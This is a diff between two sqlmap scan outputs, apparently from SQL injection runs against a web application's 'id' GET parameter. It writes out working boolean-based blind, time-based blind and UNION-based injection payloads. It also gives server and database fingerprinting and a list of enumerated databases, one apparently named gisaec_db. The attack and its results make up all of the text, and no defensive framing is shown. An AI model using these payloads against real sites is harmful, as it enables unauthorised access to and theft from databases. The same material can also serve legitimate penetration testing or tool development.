@@ -1,17 +1,21 @@
-sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=72 AND 1300=1300
+    Payload: id=72 AND 2726=2726
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=72 AND SLEEP(5)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 5 columns
-    Payload: id=-4635 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71787a7a71,0x6f50617971644a54416a71514175654b43437a697166734d6c686a5857744377735a464370516546,0x7178787871),NULL-- VoHx
+    Payload: id=-3649 UNION ALL SELECT NULL,NULL,CONCAT(0x716a786b71,0x656474416865636d5a63417841585955496674496e4f4c73544f6f6a496550736d65447158497866,0x71766a7a71),NULL,NULL-- WDfR
 ---
 web server operating system: Linux CentOS
 web application technology: Apache 2.2.23, PHP 5.2.17
-back-end DBMS: MySQL >= 5.0.0
+back-end DBMS: MySQL >= 5.0.12
 available databases [3]:
 [*] gisaec_db
 [*] information_schema
